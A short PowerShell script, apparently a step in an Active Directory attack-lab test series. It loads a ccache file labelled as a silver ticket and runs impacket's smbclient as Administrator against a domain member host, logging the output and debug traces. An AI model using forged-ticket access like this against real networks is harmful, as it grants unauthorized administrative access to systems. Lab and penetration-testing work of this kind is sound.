# WT011 silver — impacket smbclient with output-to-file + debug
$ErrorActionPreference = 'Continue'
$out = 'C:\Tools\ADTools'
$env:KRB5CCNAME = "$out\wt011-silver.ccache"

Write-Output "KRB5CCNAME=$env:KRB5CCNAME"
Write-Output "CCACHE_EXISTS $(Test-Path $env:KRB5CCNAME)"

# List ccache content via impacket's kerberos? Just run smbclient with -debug to file
$cmd = "python -m impacket.examples.smbclient -k -no-pass 'child.cadre.local/Administrator@mbr01.child.cadre.local' -c 'ls' > `"$out\wt011-smb.out`" 2>&1"
cmd.exe /c $cmd
Start-Sleep -Seconds 2
Write-Output '--- SMB OUT ---'
Get-Content "$out\wt011-smb.out" -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object { Write-Output "SMB|$_" }

# Try with debug flag for diagnosis
$cmd2 = "python -m impacket.examples.smbclient -k -no-pass -debug 'child.cadre.local/Administrator@mbr01.child.cadre.local' -c 'ls' > `"$out\wt011-smb-debug.out`" 2>&1"
cmd.exe /c $cmd2
Start-Sleep -Seconds 2
Write-Output '--- SMB DEBUG OUT ---'
Get-Content "$out\wt011-smb-debug.out" -ErrorAction SilentlyContinue | Select-Object -First 25 | ForEach-Object { Write-Output "SMBDBG|$_" }
Write-Output 'WT011_SMB_DONE'
